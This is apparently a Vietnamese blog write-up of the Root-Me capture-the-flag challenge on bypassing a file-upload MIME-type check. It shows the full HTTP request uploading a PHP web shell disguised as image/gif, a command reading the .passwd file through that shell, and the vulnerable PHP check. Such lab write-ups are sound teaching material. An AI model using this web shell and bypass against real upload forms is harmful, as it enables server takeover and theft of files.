<main class="main" role="main">
    <div class="content">
        <article id="post-fileupload/fileupload_chall2" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    File upload - MIME type
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
               </div>
            </div>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Thu-Thach"><a href="#Thu-Thach" class="headerlink" title="Thử Thách"></a>Thử Thách</h1>
                <p>URL: <a href="https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type</a></p>
                <h2 id="Tieu-de"><a href="#Tieu-de" class="headerlink" title="Tiêu đề"></a>Tiêu đề</h2>
                <p>Gallery v0.03</p>
                <h2 id="Mo-ta"><a href="#Mo-ta" class="headerlink" title="Mô tả"></a>Mô tả</h2>
                <p>Your goal is to hack this photo galery by uploading PHP code.<br>Retrieve the validation password in the file .passwd.</p>
                <button id="read-writeup"><span><img src="public/images/more.png" /></span>Xem Hướng Dẫn</button>
                <p style="color: red; margin-left: 10px; font-weight: bold">Hãy cố gắng tự làm bằng hết sức mình trước, xem hướng dẫn ngay từ đầu thì bạn sẽ mất nhiều thứ đó..</p>
                <script type="text/javascript">
                    $(document).ready(function(){
                        $("#read-writeup").click(function(){
                            $("#w-content").toggle();
                        });
                    });
                </script>
                <div id="w-content" style="display: none">
                <h1 id="Huong-Dan"><a href="#Huong-Dan" class="headerlink" title="Hướng Dẫn"></a>Hướng Dẫn</h1>
                <h3 id="Muc-tieu-tan-cong"><a href="#Muc-tieu-tan-cong" class="headerlink" title="Mục tiêu tấn công"></a>Mục tiêu tấn công</h3>
                <p>Upload file có đuôi .php sau đó, dùng nó để đọc file .passwd ở thư mục root.</p>
                <h3 id="Khai-thac-nao"><a href="#Khai-thac-nao" class="headerlink" title="Khai thác nào."></a>Khai thác nào.</h3>
                <p>Ta thay đổi lại MIME type cho đúng với MIME của hình ảnh trước khi upload lên server, một số MIME type để tham khảo:</p>
                <ul>
                    <li>jpg hay jpeg =&gt; image/jpeg</li>
                    <li>png =&gt; image/png</li>
                    <li>gif =&gt; image/gif</li>
                    <li>php =&gt; application/octet-stream</li>
                </ul>
                <p>Xem thêm tại đây: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Complete_list_of_MIME_types" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Complete_list_of_MIME_types</a></p>
                <figure class="highlight bash">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line">POST /web-serveur/ch21/?action=upload HTTP/1.1</span><br><span class="line">Host: challenge01.root-me.org</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-GB,en;q=0.5</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------180132086612644</span><br><span class="line">Content-Length: 235</span><br><span class="line">Referer: http://challenge01.root-me.org/web-serveur/ch21/?action=upload</span><br><span class="line">Cookie: PHPSESSID=6utcrq0b6elcn7a4s1egkbjgn6</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------180132086612644</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"file"</span>; filename=<span class="string">"shell.php"</span></span><br><span class="line">Content-Type: image/gif</span><br><span class="line"></span><br><span class="line">&lt;?php system(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]); ?&gt;</span><br><span class="line">-----------------------------180132086612644--</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p>Ta upload được shell lên server rồi. Từ đó dễ dàng đọc được <strong>flag</strong>.</p>
                <blockquote>
                    <p>linktoshell/shell.php?cmd=cat ../../../.passwd</p>
                </blockquote>
                <h2 id="Doc-file-upload-va-phan-tich-loi"><a href="#Doc-file-upload-va-phan-tich-loi" class="headerlink" title="Đọc file upload và phân tích lỗi"></a>Đọc file upload và phân tích lỗi</h2>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">"file"</span>])) {</span><br><span class="line">        $allowedExts = <span class="keyword">array</span>(<span class="string">"jpg"</span>, <span class="string">"jpeg"</span>, <span class="string">"gif"</span>, <span class="string">"png"</span>);</span><br><span class="line">        $allowedType = <span class="keyword">array</span>(<span class="string">"image/gif"</span>, <span class="string">"image/jpeg"</span>, <span class="string">"image/png"</span>);</span><br><span class="line"></span><br><span class="line">        $extension = end(explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">100000</span>)) {</span><br><span class="line">          <span class="keyword">if</span> (in_array($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>], $allowedType)) {</span><br><span class="line">            $aff .= <span class="string">"File information&amp;nbsp;:&lt;br&gt;&lt;ul&gt;"</span>;</span><br><span class="line">            <span class="keyword">if</span> (! file_exists($upload_dir)) {</span><br><span class="line">                mkdir($upload_dir, <span class="number">0750</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $upload_dir.<span class="string">"/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>])) {</span><br><span class="line">                $aff .= <span class="string">"&lt;b&gt;File uploaded&lt;/b&gt;."</span>;</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                $aff .= <span class="string">"&lt;p style='color: red'&gt;Error during upload&lt;/p&gt;"</span>;</span><br><span class="line">            }</span><br><span class="line">          } <span class="keyword">else</span> {</span><br><span class="line">              $aff .= <span class="string">"&lt;p style='color: red'&gt;Wrong file type !&lt;/p&gt;"</span>;</span><br><span class="line">          }</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            $aff .= <span class="string">"&lt;p style='color: red'&gt;File size too big !&lt;/p&gt;"</span>;</span><br><span class="line">        }</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p>Đoạn code kỉ kiểm tra <strong>in_array($_FILES[“file”][“type”], $allowedType)</strong><br>nên ta có thể bypass được dễ dàng.</p>
                </div></div>
        </article>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>

</main>